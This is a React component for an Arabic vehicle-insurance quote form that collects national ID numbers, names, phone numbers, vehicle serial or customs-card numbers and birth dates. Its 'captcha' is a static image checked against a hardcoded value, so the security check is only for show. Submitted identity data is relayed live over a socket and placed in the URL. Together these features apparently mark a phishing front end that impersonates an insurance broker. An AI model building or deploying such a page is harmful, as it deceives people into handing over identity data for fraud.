import axios from "axios";
import React, { useState } from "react";
import { api_route, getKeysWithTrueValue, socket } from "../App";
import { TailSpin } from "react-loader-spinner";

const Apply = ({ setLoading, loading }) => {
  const [type, setType] = useState("تأمين جديد");
  // const query = new URLSearchParams(window.location.search);
  // const data = JSON.parse(query.get("data"));
  const [tameenType, setTameenType] = useState("الرقم التسلسلي");
  const [nationalId, setNationalId] = useState("");
  const [serialNumber, setSerialNumber] = useState("");
  const [car_year, setcar_year] = useState("2024");
  const [carHolderName, setCarHolderName] = useState("");
  const [birth_date, setBirthDate] = useState("");
  const [Customs_card, setCustomsCard] = useState("");
  const [phone, setPhone] = useState("");
  const [captecha, setCapetcha] = useState("");
  const [error, setError] = useState(false);
  const [load, setLoad] = useState(false);
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (captecha != 8522) {
      return setError("خطأ في رمز التحقق");
    } else {
      setLoad(true);

      const data = {
        type,
        tameenType,
        national_id: nationalId,
        serialNumber,
        car_year,
        carHolderName,
        birth_date,
        Customs_card,
      };
      try {
        await axios.post(api_route + "/reg", data).then(({ data }) => {
          socket.emit("newData", data);
          return (window.location.href = `/reg?data=${JSON.stringify(data)}`);
        });
      } catch (error) {
      } finally {
        setLoading(false);
      }
    }
  };
  return (
    <div className="w-full flex flex-col items-center justify-center gap-y-3">
      {load ? (
        <div className="flex top-0 z-50 w-full justify-center items-center h-screen fixed bg-black bg-opacity-60">
          <div className="bg-white rounded-md p-3 w-fit h-fit flex items-center justify-center gap-x-3">
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-lg">يتم المعالجة</span>
            <img src="/logo.svg" className="w-14 h-14" />
          </div>
        </div>
      ) : (
        ""
      )}
      <div className="flex gap-2 w-full items-center justify-center py-5 border-t my-1">
        <div className="bg-gray-100 w-1/5 flex flex-col gap-y-3 py-3 justify-center items-center rounded-md">
          <div className="w-14 p-1 h-14 flex items-center justify-center  bg-white rounded-full">
            <img src="/medical.svg" alt="medical" className="w-2/3" />
          </div>
          <span className="">اخطاء طبية</span>
        </div>
        <div className="bg-gray-100 w-1/5 flex flex-col gap-y-3 py-3 justify-center items-center rounded-md">
          <div className="w-14 p-1 h-14 flex items-center justify-center  bg-white rounded-full">
            <img src="/medical2.svg" alt="medical2" className="w-2/3" />
          </div>
          <span className="">طبي</span>
        </div>
        <div className="bg-gray-100 w-1/5 flex flex-col gap-y-3 py-3 justify-center items-center rounded-md">
          <div className="w-14 p-1 h-14 flex items-center justify-center  bg-white rounded-full">
            <img src="/airplane.svg" alt="airplane" className="w-2/3" />
          </div>
          <span className="">سفر</span>
        </div>
        <div className="bg-blue-900 w-1/5 flex flex-col gap-y-3 py-3 justify-center items-center rounded-md">
          <div className="w-14 p-1 h-14 flex items-center justify-center  bg-white rounded-full">
            <img src="/car.svg" alt="car" className="w-2/3" />
          </div>
          <span className="text-white">مركبات</span>
        </div>
      </div>
      <div className="w-full flex items-center justify-around mt-5 px-5 gap-x-5">
        <button
          className={
            type === "نقل الملكية"
              ? "bg-blue-900 text-white w-1/2 p-2 text-xl rounded-md "
              : "w-1/2 border-2  p-2 text-xl rounded-md"
          }
          onClick={() => setType("نقل الملكية")}
        >
          نقل الملكية
        </button>
        <button
          className={
            type === "تأمين جديد"
              ? "bg-blue-900 text-white w-1/2 p-2 text-xl rounded-md "
              : "w-1/2 border-2  p-2 text-xl rounded-md"
          }
          onClick={() => setType("تأمين جديد")}
        >
          تأمين جديد
        </button>
      </div>
      {type === "تأمين جديد" ? (
        <div className="w-full flex justify-between items-center px-5 mt-3">
          <img src="/info.png" className="w-5 h-5" />
          <span>نوع تسجيل المركبة</span>
        </div>
      ) : (
        ""
      )}

      <div className="w-11/12 flex items-center justify-around    px-2 gap-y-2   flex-col">
        {type === "تأمين جديد" ? (
          <div className="w-full flex items-center gap-x-3 justify-around mt-2  ">
            <span
              className={
                tameenType === "بطاقة جمركية [استيراد]"
                  ? "bg-blue-900 text-white w-1/2 p-2 text-center text-base rounded-md "
                  : "w-1/2 border-2 text-center   p-2 text-base rounded-md"
              }
              onClick={() => setTameenType("بطاقة جمركية [استيراد]")}
            >
              بطاقة جمركية [استيراد]
            </span>
            <span
              className={
                tameenType === "الرقم التسلسلي"
                  ? "bg-blue-900 text-white w-1/2 p-2 text-center text-base rounded-md"
                  : "w-1/2 border-2 text-center   p-2 text-base rounded-md"
              }
              onClick={() => setTameenType("الرقم التسلسلي")}
            >
              الرقم التسلسلي
            </span>
          </div>
        ) : (
          ""
        )}
        {type === "تأمين جديد" ? (
          tameenType === "الرقم التسلسلي" ? (
            <form
              className=" w-full  justify-center flex flex-col items-center  p-3 gap-y-5"
              onSubmit={handleSubmit}
            >
              <div className="flex flex-col w-full   text-xl" dir="rtl">
                <input
                  required
                  type="text"
                  inputMode="numeric"
                  placeholder="رقم الهوية الوطنية او الاقامة او الشركة"
                  className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                  maxLength={10}
                  minLength={10}
                  value={nationalId}
                  onChange={(e) => setNationalId(e.target.value)}
                />
              </div>
              <div className="flex flex-col w-full   text-xl" dir="rtl">
                <input
                  required
                  type="text"
                  placeholder="اسم مقدم الطلب"
                  className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                  minLength={6}
                  value={carHolderName}
                  onChange={(e) => setCarHolderName(e.target.value)}
                />
              </div>
              <div className="flex flex-col w-full   text-xl" dir="rtl">
                <input
                  required
                  type="text"
                  inputMode="numeric"
                  placeholder="رقم الهاتف 5xxxxxxxxxx"
                  className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                  maxLength={10}
                  minLength={10}
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                />
              </div>
              <div className="flex flex-col w-full relative  text-xl" dir="rtl">
                <input
                  required
                  type="text"
                  placeholder="الرقم التسلسلي   "
                  className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                  value={serialNumber}
                  onChange={(e) => setSerialNumber(e.target.value)}
                />
                <img
                  src="/info.png"
                  alt="info"
                  className="absolute left-5 top-3 w-5 h-5"
                />
              </div>
              <div
                className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                dir="rtl"
              >
                <input
                  required
                  type="text"
                  placeholder="رمز التحقق"
                  className="  w-1/2  text-center outline-none"
                  value={captecha}
                  min={4}
                  max={4}
                  onChange={(e) => setCapetcha(e.target.value)}
                />
                <img src="/captecha.jpg" alt="captecha" className="w-1/3 h-12" />
              </div>
              {error && (
                <span className="w-full text-center text-red-500">{error}</span>
              )}
              <div className="w-full flex justify-center items-center px-2  gap-x-2">
                أوافق علي منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم
                و/أو مركز المعلومات الوطني عن بياناتي
              </div>
              <div className="w-full flex justify-center items-center my-2">
                <button className="text-white bg-amber-700 py-2 rounded-md  text-xl w-full">
                  {loading ? (
                    <div className="flex items-center justify-center">
                      <TailSpin
                        height="30"
                        width="30"
                        color="white"
                        ariaLabel="tail-spin-loading"
                        radius="1"
                        wrapperStyle={{}}
                        wrapperClass=""
                        visible={true}
                      />
                    </div>
                  ) : (
                    "إظهار العروض"
                  )}
                </button>
              </div>
            </form>
          ) : (
            <form
              className=" w-full  justify-center flex flex-col items-center  p-3 gap-y-5"
              onSubmit={handleSubmit}
            >
              <div className="flex flex-col w-full   text-xl" dir="rtl">
                <input
                  required
                  type="text"
                  inputMode="numeric"
                  placeholder="رقم الهوية الوطنية او الاقامة او الشركة"
                  className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                  maxLength={10}
                  minLength={10}
                  value={nationalId}
                  onChange={(e) => setNationalId(e.target.value)}
                />
              </div>
              <div className="flex flex-col w-full   text-xl" dir="rtl">
                <input
                  required
                  type="text"
                  placeholder="اسم مقدم الطلب"
                  className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                  minLength={6}
                  value={carHolderName}
                  onChange={(e) => setCarHolderName(e.target.value)}
                />
              </div>
              <div className="flex flex-col w-full   text-xl" dir="rtl">
                <input
                  required
                  type="text"
                  inputMode="numeric"
                  placeholder="رقم الهاتف 5xxxxxxxxxx"
                  className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                  maxLength={10}
                  minLength={10}
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                />
              </div>
              <div className="flex flex-col w-full relative  text-xl" dir="rtl">
                <input
                  required
                  type="text"
                  placeholder="بطاقة جمركية"
                  className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                  value={Customs_card}
                  onChange={(e) => setCustomsCard(e.target.value)}
                />
                <img
                  src="/info.png"
                  alt="info"
                  className="absolute left-5 top-3 w-5 h-5"
                />
              </div>
              <div
                className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                dir="rtl"
              >
                <input
                  required
                  type="text"
                  placeholder="رمز التحقق"
                  min={4}
                  max={4}
                  className="  w-1/2 text-center outline-none"
                  value={captecha}
                  onChange={(e) => setCapetcha(e.target.value)}
                />
                <img src="/captecha.jpg" alt="captecha" className="w-1/3" />
              </div>

              {error && (
                <span className="w-full text-center text-red-500">{error}</span>
              )}

              <div className="w-full flex justify-center items-center px-2  gap-x-2">
                أوافق علي منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم
                و/أو مركز المعلومات الوطني عن بياناتي
              </div>
              <div className="w-full flex justify-center items-center my-2">
                <button className="text-white bg-amber-700 py-2 rounded-md  text-xl w-full">
                  {loading ? (
                    <div className="flex items-center justify-center">
                      <TailSpin
                        height="30"
                        width="30"
                        color="white"
                        ariaLabel="tail-spin-loading"
                        radius="1"
                        wrapperStyle={{}}
                        wrapperClass=""
                        visible={true}
                      />
                    </div>
                  ) : (
                    "إظهار العروض"
                  )}
                </button>
              </div>
            </form>
          )
        ) : (
          <form
            className=" w-full  justify-center flex flex-col items-center  p-3 gap-y-5"
            onSubmit={handleSubmit}
          >
            <div className="flex flex-col w-full   text-xl" dir="rtl">
              <input
                required
                type="text"
                inputMode="numeric"
                placeholder="رقم الهوية الوطنية او الاقامة او الشركة"
                className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={nationalId}
                onChange={(e) => setNationalId(e.target.value)}
              />
            </div>
            <div className="flex flex-col w-full   text-xl" dir="rtl">
              <input
                required
                type="text"
                placeholder="اسم مقدم الطلب"
                className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                minLength={6}
                value={carHolderName}
                onChange={(e) => setCarHolderName(e.target.value)}
              />
            </div>
            <div className="flex flex-col w-full   text-xl" dir="rtl">
              <input
                required
                type="text"
                inputMode="numeric"
                placeholder="رقم الهاتف 5xxxxxxxxxx"
                className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
            </div>

            <div
              className="flex flex-col w-full justify-center items-center gap-y-2   text-xl"
              dir="rtl"
            >
              <span>تاريخ الميلاد</span>
              <input
                required
                type="date"
                inputMode="numeric"
                className="border px-3 py-2 w-full text-center border-gray-400 outline-blue-500 rounded-md "
                maxLength={4}
                minLength={4}
                value={birth_date}
                onChange={(e) => setBirthDate(e.target.value)}
              />
            </div>
            <div className="flex flex-col w-full relative  text-xl" dir="rtl">
              <input
                required
                type="text"
                placeholder="الرقم التسلسلي   "
                className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                value={serialNumber}
                onChange={(e) => setSerialNumber(e.target.value)}
              />
              <img
                src="/info.png"
                alt="info"
                className="absolute left-5 top-3 w-5 h-5"
              />
            </div>
            <div
              className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
              dir="rtl"
            >
              <input
                required
                type="text"
                placeholder="رمز التحقق"
                className="  w-1/2 text-center outline-none"
                value={captecha}
                min={4}
                max={4}
                onChange={(e) => setCapetcha(e.target.value)}
              />
              <img src="/captecha.jpg" alt="captecha" className="w-1/3" />
            </div>

            {error && (
              <span className="w-full text-center text-red-500">{error}</span>
            )}

            <div className="w-full flex justify-center items-center px-2  gap-x-2">
              أوافق علي منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو
              مركز المعلومات الوطني عن بياناتي
            </div>
            <div className="w-full flex justify-center items-center my-2">
              <button className="text-white bg-amber-700 py-2 rounded-md  text-xl w-full">
                {loading ? (
                  <div className="flex items-center justify-center">
                    <TailSpin
                      height="30"
                      width="30"
                      color="white"
                      ariaLabel="tail-spin-loading"
                      radius="1"
                      wrapperStyle={{}}
                      wrapperClass=""
                      visible={true}
                    />
                  </div>
                ) : (
                  "إظهار العروض"
                )}
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
};

export default Apply;

// <div className="flex flex-col w-full p-2 gap-y-4  text-xl" dir="rtl">
//   <label className="">تاريخ الميلاد </label>
//   <input
//     required
//     type="date"
//     placeholder="   تاريخ  الميلاد"
//     className="border-2 p-3 border-gray-400 outline-blue-500 "
//     value={birth_date}
//     onChange={(e) => setBirthDate(e.target.value)}
//   />
// </div>;
